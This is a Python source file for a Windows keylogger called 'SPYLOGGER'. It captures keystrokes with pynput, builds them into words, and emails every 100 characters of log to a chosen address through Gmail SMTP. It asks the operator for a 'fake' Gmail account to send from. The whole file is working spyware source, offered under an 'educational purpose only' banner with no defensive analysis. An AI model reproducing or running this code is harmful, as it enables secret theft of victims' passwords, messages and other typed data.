############  [CODED BY :ANIRUDH] ######### [www.github.com/anii-py] ############### PEACE WITH PYTHON ###############
# windows edition

import smtplib         # To send emails
import getpass         # To hide passwords
try:
    from pynput.keyboard import Key,Listener
except ModuleNotFoundError:
    print("Module not installed please install pynput module\n(pip install pynput)")

from email.mime.multipart import MIMEMultipart        
from email.mime.text import MIMEText                  
from email.mime.base import MIMEBase                  

print("""
                            
    ███████╗██████╗ ██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
    ██╔════╝██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
    ███████╗██████╔╝ ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
    ╚════██║██╔═══╝   ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
    ███████║██║        ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
    ╚══════╝╚═╝        ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
                    --------FOR WINDOWS 7/8/8.1/10---------                                                
[ C O D E D  by:  Anirudh]          [W A R N I N G !: FOR EDUCATIONAL PURPOSE ONLY !]                                                                                                        
                                                                                                  
""")

print("\nYou Need to setup a Gmail of your own to send the Keylogs.[with allow less secure apps enabled]\n")

sender_mail = input("\nEnter your Fake gmail id(sender):")                                                                                                            
sender_pass = getpass.getpass(prompt="GMAIL password:",stream=None)
reciever_mail = input("Enter the reciever mail:")
server = smtplib.SMTP_SSL('smtp.gmail.com',465)
try:
    server.login(sender_mail,sender_pass)
except smtplib.SMTPAuthenticationError:
    print("\nWrong username or password,try again.")
    quit()

full_log = ' '
word = ' '
char_limit = 100
        
def on_press(key):
    global word
    global full_log
    global sender_email
    global char_limit

    key = str(key)

    if key == "Key.space" or key == "Key.enter":
        word = word + ' '
        full_log = full_log + word
        word = ''
        if len(full_log) >= char_limit:
            send_log()
            full_log = " "
    elif key == "Key.shift_l" or key == "Key.shift_r":
        return
    elif key == "Key.ctrl_l" or key == "Key.ctrl_r":
        return
    elif key == "Key.backspace":
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
    if key == "Key.esc":
        return False

def send_log():
    message = MIMEMultipart()
    message['From'] = sender_mail
    message['To'] = reciever_mail
    message['Subject'] = "LOGS !"
    message.attach(MIMEText(full_log, 'plain'))
    text = message.as_string()
    server.sendmail(sender_mail,reciever_mail,text)

with Listener(on_press=on_press) as ls:
    ls.join()

#######################################################################################################
#   c o d e d by : Anirudh                                            # For EdUcAtIoNAL purpose oNlY
                            #   www.github.com/anii-py                                                   
#######################################################################################################
